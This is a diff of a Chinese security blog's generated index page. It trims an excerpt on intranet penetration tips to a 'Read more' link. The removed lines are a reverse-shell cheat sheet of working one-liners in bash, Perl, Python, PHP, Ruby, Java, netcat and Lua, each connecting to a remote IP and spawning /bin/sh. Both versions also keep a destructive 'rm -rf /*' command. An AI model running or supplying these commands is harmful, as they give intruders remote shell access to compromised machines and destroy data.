@@ -448,34 +448,17 @@
 
       
         
-          
-            <h3 id="内网渗透中的一些Tips"><a href="#内网渗透中的一些Tips" class="headerlink" title="内网渗透中的一些Tips"></a>内网渗透中的一些Tips</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rm -rf /*</span><br></pre></td></tr></table></figure>
+          <h3 id="内网渗透中的一些Tips"><a href="#内网渗透中的一些Tips" class="headerlink" title="内网渗透中的一些Tips"></a>内网渗透中的一些Tips</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rm -rf /*</span><br></pre></td></tr></table></figure>
 
 <p>大佬的Tips: <a href="https://github.com/Ridter/Intranet_Penetration_Tips" target="_blank" rel="noopener">下载链接</a></p>
-<h3 id="反弹shell常见命令"><a href="#反弹shell常见命令" class="headerlink" title="反弹shell常见命令"></a>反弹shell常见命令</h3><p>bash</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p>Perl</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
-
-<p>python</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
-
-<p>php</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
-
-<p>ruby</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
-
-<p>java</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
-
-<p>NC</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用-e </span></span><br><span class="line">nc -e /bin/sh 223.8.200.234 1234 </span><br><span class="line"><span class="comment">#不使用-e</span></span><br><span class="line">mknod /tmp/backpipe p</span><br><span class="line">/bin/sh 0/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
-
-<p>Lua</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
-          
+<h3 id="反弹shell常见命令"><a href="#反弹shell常见命令" class="headerlink" title="反弹shell常见命令"></a>反弹shell常见命令</h3>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/01/04/tips/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
